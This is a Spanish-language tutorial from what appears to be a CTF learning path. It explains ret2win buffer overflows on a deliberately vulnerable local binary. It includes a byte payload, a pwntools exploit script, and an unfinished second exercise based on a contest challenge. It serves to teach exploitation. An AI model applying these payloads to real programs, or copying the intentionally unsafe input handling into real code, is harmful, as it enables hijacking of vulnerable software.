---
original autor: CrazyCat
coautor: naibu3
---

#bufferOverflow 

# 02 - Return to win

## ¿Qué es?

Ya hemos visto cómo funciona un *buffer overflow*, sin embargo, sólo lo hemos utilizado para sobrescribir valores de variables.

Otra utilidad, sería en lugar de sobreescribir un valor, sobreescribir una dirección de retorno, de forma que al volver de la ejecución de una función, en lugar de volver a *main*, retorne a una función arbitraria.

## Ejercicio1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código:

```c
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");
    return;
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}
```

Como véis, hay una función `hacked()` a la que no se llama en ningún momento.

Vamos a comenzar por compilar el código (eliminando las protecciones):

```bash
gcc -o ret2win ret2win.c -fno-stack-protector -z execstack -no-pie -m32
```


### Reconocimiento del binario

Vamos a comenzar la fase de reconicimiento como siempre, lanzando [[checksec]] y `file`:

```bash
file ret2win
```
```file
ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5978b724ef3c617522fe2a86c281910b02480b0e, for GNU/Linux 3.2.0, not stripped
```
> Vemos que es `LSB`, `dinamically linked`, `32-bit`...

```bash
checksec ret2win
```
```checksec
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segment
```
> Y no tiene protecciones activadas.

Vamos a probar a ejecutar:

```bash
./ret2win
```
```ret2win
Name:
hola
Hi there, hola
```

Vemos que nos pide un nombre y lo muestra por pantalla. Vamos a probar a introducir muchos carácteres:

```ret2win
Name:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    68939 segmentation fault  ./ret2win
```

Vemos que ha dado un *segmentation fault*, lo que nos da la sospecha de que hemos sobreescrito algo, una variable o una dirección de retorno (*return address*).

Si vemos el código (puedes también descompilarlo con [[ghidra]]):

```c
void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}
```

Vemos que se llama a la función `register_name()` que tiene una variable `buffer` y que se rellena con `scanf()`. También como apuntamos antes, hay una función `hacked()` a la que nunca se llama.

Parece ser que el *segmentation fault* puede ser debido a que `scanf` introduce más carácteres de los que permite *buffer*, probablemente sobreescribiendo la dirección de retorno de la función.

#### Explotación

Como vemos, al iniciar el programa, `main()` llama a `register_name()`, que pide un nombre, lo imprime y regresa. Sin embargo, podríamos tratar de sobreescribir la dirección de retorno de forma que `register_name()` no vuelva a name, sino que por ejemplo vuelva a `hacked()`.

Vamos a comenzar abriendo [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndg ret2win
```

Podemos ver las unciones con:

```gdb
info functions
```
```gdb
[...]
0x08049182  hacked
0x080491ad  register_name
0x08049203  main
[...]
```

Ahora debemos ver a partir de que número de carácteres se empieza a sobreescribir la *return address*. Para ello, el propio plugin ([[pwndbg]]) incorpora una función interesante:

```gdb
cyclic 100
```
```gdb
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Esto nos genera una secuencia de 100 carácteres en los que cada cuatro *a*, se intercala una letra. De esta forma podemos identificar cuándo se sobreescribe la *return address*.

```gdb
run
```
```ret2win
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
```

Vemos que como era de esperar ha dado error, pero podemos ver más cosas:

```gdb
[...]
*EIP  0x61616168 ('haaa')
[...]
```

Nos interesan los 4 bits del puntero de instrucción (*instruction pointer*), `EIP`. Como vemos son `haaa`. Además, con `cyclic`, también podemos contar rápidamente la posición en qué empiezan esos bits:

```gdb
cyclic -l haaa
```
```cyclic
[...]
Found at offset 28
```


##### Prueba de concepto

Ya podríamos ir directamente a explotar la vulnerabilidad, sin embargo, hagamos una pequeña prueba. Ejecutamos la siguiente línea:

```python
python2 -c 'print 28*"A" + 4*"B" + 32*"C"'
```
```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Si ejecutamos y pasamos dicha cadena:

```gdb
run
```
```ret2win
Name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```
```ret2win
[...]
*EBP  0x41414141 ('AAAA')
*ESP  0xffffd100 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
*EIP  0x42424242 ('BBBB')
[...]
```

Podemos ver que las *B* se están guardando en el puntero de pila, tal y como queríamos. A modo de spoiler para los siguientes temas, vemos que las *C* se guardan en `ESP`, esto podríamos aprovecharlo para introducir ahí un *shellcode* y que el valor que pusieramos en las *B* fuera esa dirección.


##### Insertando el *return adress*

Ya solo queda insertar el *return address* de `hacked` en la cadena que hemos generado. Para ello, debemos sacar la dirección. De la salida de `info functions` (la llamamos antes):

```gdb
[...]
0x08049182  hacked
[...]
```

Para insertarla en la cadena con las *A* utilizaremos python (puedes hacerlo también cambiando el valor con [[gdb]]). Recuerda ponerlo al revés ya que es `LSB` y mandarlo a un fichero, ya que no podemos copiarlo y pegarlo (como vimos en los ejercicios anteriores):

```python
python2 -c 'print 28*"A" + "\x82\x91\x04\x08"' > payload
```

Ejecutamos:

```bash
./ret2win < payload
```
```ret2win
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
This function is TOP SECRET! How did you get in here?! :O
[1]    106112 segmentation fault  ./ret2win < payload
```

Vemos que hemos conseguido ejecutar la función! Da también un error de segmentación, debido a que la función `hacked` no tiene ningún `return` (eso debemos tenerlo en cuenta en ciertas situaciones).

Con [[gdb]]:

```gdb
run < payload
```

Y el resultado es el mismo.


### Script

Como siempre tenemos también un script escrito en python con la librería [[pwntools]] para resolver el ejercicio.

```python
#!/bin/python3
from pwn import *

exe = './ret2win'
io = process(exe)

padding = 28 #Cantidad de bytes hasta la direccion de retorno

payload = flat(
    b'A' * 28,
    0x08049182 #hacked()
)

# Send the payload
io.sendlineafter(b':', payload)

# Recibe las dos lineas que no necesitamos
io.recvline()
io.recvline()

print(io.recvline().decode()) #Imprime la linea de hacked

# Receive the flag
io.close()
```

## Ejercicio2

!!!! Incompleto

Este ejercicio es el reto *Easy Register* de la competición *Intigriti 1337UP*. 

### Reconocimiento del binario

```
❯ file easy_register
easy_register: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba448db2793d54d5ef48046ff85490b3b875831c, for GNU/Linux 3.2.0, not stripped
❯ checksec easy_register
[*] '/home/naibu3/hack/aularedes/pwn_learning_path/ejercicios/02_Ret2Win/ejercicio2/easy_register'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

```easy_register
  _ _______________ _   _ ____  
 / |___ /___ /___  | | | |  _ \ 
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/ 
 |_|____/____//_/   \___/|_|    
                                
[i] Initialized attendee listing at 0x7fffffffdea0.
[i] Starting registration application.

Hacker name > hola

[+] Registration completed. Enjoy!
[+] Exiting.
```

```c
void banner(void)

{
  puts("\x1b[35m  _ _______________ _   _ ____  \x1b[0m");
  puts("\x1b[35m / |___ /___ /___  | | | |  _ \\ \x1b[0m");
  puts("\x1b[35m | | |_ \\ |_ \\  / /| | | | |_) |\x1b[0m");
  puts("\x1b[35m | |___) |__) |/ / | |_| |  __/ \x1b[0m");
  puts("\x1b[35m |_|____/____//_/   \\___/|_|    \x1b[0m");
  puts("\x1b[35m                                \x1b[0m");
  return;
}
```
```c
void easy_register(void)

{
  char local_58 [80];
  
  printf("[\x1b[34mi\x1b[0m] Initialized attendee listing at %p.\n",local_58);
  puts("[\x1b[34mi\x1b[0m] Starting registration application.\n");
  printf("Hacker name > ");
  gets(local_58);
  puts("\n[\x1b[32m+\x1b[0m] Registration completed. Enjoy!");
  puts("[\x1b[32m+\x1b[0m] Exiting.");
  return;
}
```
```c
undefined8 main(void)

{
  banner();
  easy_register();
  return 0;
}
```

```gdb-pwndbg
[...]
0x00000000000011dc  banner
0x000000000000122f  easy_register
0x000000000000129c  main
[...]
```
> Solo vemos *offsets* debido al *PIE*.


```gdb-pwndbg
break main
```
```gdb-pwndbg
run
```
```gdb-pwnbg
disassem main
```
```gdb-pwndbg
Dump of assembler code for function main:
   0x000055555555529c <+0>:	endbr64 
   0x00005555555552a0 <+4>:	push   rbp
[...]
```
> Durante sí vemos las direcciones (*base+offset*)

